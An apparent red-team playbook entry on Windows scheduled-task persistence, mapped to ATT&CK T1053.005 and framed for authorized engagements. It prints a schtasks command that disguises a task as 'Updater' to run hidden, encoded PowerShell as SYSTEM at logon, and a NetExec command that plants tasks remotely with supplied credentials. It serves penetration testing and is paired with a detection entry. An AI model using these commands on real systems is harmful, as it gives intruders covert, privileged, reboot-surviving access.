---
id: schtask-persist
title: Scheduled-task persistence (schtasks /create)
section: Persistence (authorized engagements only)
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1053.005]
platform: [windows]
source: hacktheplanet §"Persistence (authorized engagements only)"
pair: schtask-4698
---

The durable, reboot-surviving callback: a scheduled task fires your payload on a
trigger (logon, idle, a fixed time) under whatever account you specify — SYSTEM
if you can. Remotely you can plant it over RPC with NetExec. Authorized
persistence testing only — clean it up and document it.

```sh
schtasks /create /tn "Updater" /tr "powershell -w hidden -enc <b64>" /sc onlogon /ru SYSTEM
nxc smb {{rhost}} -u {{user}} -p {{password}} -M schtask_as -o CMD='whoami'
```
